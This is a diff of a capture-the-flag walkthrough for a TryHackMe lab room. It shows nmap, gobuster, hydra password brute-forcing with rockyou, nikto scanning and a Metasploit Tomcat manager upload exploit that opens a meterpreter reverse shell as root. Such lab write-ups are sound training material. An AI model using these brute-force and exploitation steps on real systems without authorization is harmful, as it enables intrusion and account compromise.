@@ -5,7 +5,9 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Premium
@@ -21,6 +23,7 @@ This room will introduce you to the following tools:
 
 If you are stuck at any point, each tool has a respective room or module.
 ```
+
 Room link: [https://tryhackme.com/r/room/toolsrus](https://tryhackme.com/r/room/toolsrus)
 
 ## Solution
@@ -28,6 +31,7 @@ Room link: [https://tryhackme.com/r/room/toolsrus](https://tryhackme.com/r/room/
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
 └─$ nmap -v -sV -sC 10.10.236.92              
@@ -97,7 +101,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
 ```
+
 We have four services running:
+
 - OpenSSH 7.2p2 on port 22
 - Apache httpd 2.4.18 on port 80
 - Apache Tomcat on port 1234
@@ -106,6 +112,7 @@ We have four services running:
 ### Search for directories and files with gobuster
 
 Next, let's search for directories and files (html, php, and txt) with `gobuster`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php,txt -u http://10.10.236.92
@@ -134,14 +141,17 @@ Progress: 350656 / 350660 (100.00%)
 Finished
 ===============================================================
 ```
-And there we the directory that begins with `g`.
+
+And there we have the directory that begins with `g`.
 
 Now we check the contents of the directory with `curl`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
 └─$ curl http://10.10.236.92/guidelines/                                                          
 Hey <b>bob</b>, did you update that TomCat server?
 ```
+
 And there we have the name of the user.
 
 ### Bruteforce the password with hydra
@@ -150,7 +160,8 @@ We see from the `gobuster` result that the `protected` directory requires authen
 
 Why not try to bruteforce bob's password with `hydra`?  
 We will use the [rockyou.txt wordlist](https://github.com/zacheller/rockyou)
-```bash          
+
+```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
 └─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.236.92 http-get /protected
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -162,9 +173,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-16 11:51:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-16 11:51:35
 ```
+
 So bob's password is `bubbles`.
 
 Now we can check the contents of the `protected` directory with `curl`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
 └─$ curl -u bob:bubbles http://10.10.236.92/protected/  
@@ -181,6 +194,7 @@ Manually browsing to `http://10.10.236.92:1234/` gives us the version of Apache 
 The version of Coyote was already found in the `nmap` version scan.
 
 Next, we scan the Manager App (the `/manager/html` directory) with `nikto`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
 └─$ nikto -url http://10.10.236.92:1234/manager/html -id bob:bubbles
@@ -293,6 +307,7 @@ Next, we scan the Manager App (the `/manager/html` directory) with `nikto`
 ### Exploit the Tomcat service
 
 Of course we want to exploit the Tomcat service and for this we use [Metasploit](https://www.metasploit.com/)
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/ToolsRus]
 └─$ msfconsole
@@ -347,7 +362,8 @@ msf6 >
 ```
 
 We have an authenticated user so let's go for 2 (Apache Tomcat Manager Authenticated Upload Code Execution)
-```
+
+```text
 msf6 > use 2
 [*] No payload configured, defaulting to java/meterpreter/reverse_tcp
 msf6 exploit(multi/http/tomcat_mgr_upload) > options
@@ -408,10 +424,12 @@ msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
 [*] Exploit completed, but no session was created.
 msf6 exploit(multi/http/tomcat_mgr_upload) > 
 ```
+
 Hhmm, for unknown reasons the exploit failed.
 
 Let's switch target and payload and try again
-```
+
+```text
 msf6 exploit(multi/http/tomcat_mgr_upload) > show targets
 
 Exploit targets:
@@ -441,10 +459,12 @@ msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
 
 meterpreter > 
 ```
+
 Ah, that's better!
 
 Now we can get a shell
-```
+
+```text
 meterpreter > sysinfo
 Computer     : ip-10-10-148-39.eu-west-1.compute.internal
 OS           : Ubuntu 16.04 (Linux 4.4.0-1075-aws)
@@ -457,11 +477,13 @@ Channel 1 created.
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
 We are running as root.
 
 ### Get the flag
 
 Finally, we locate and cat the flag
+
 ```bash
 cd /root
 ls -la
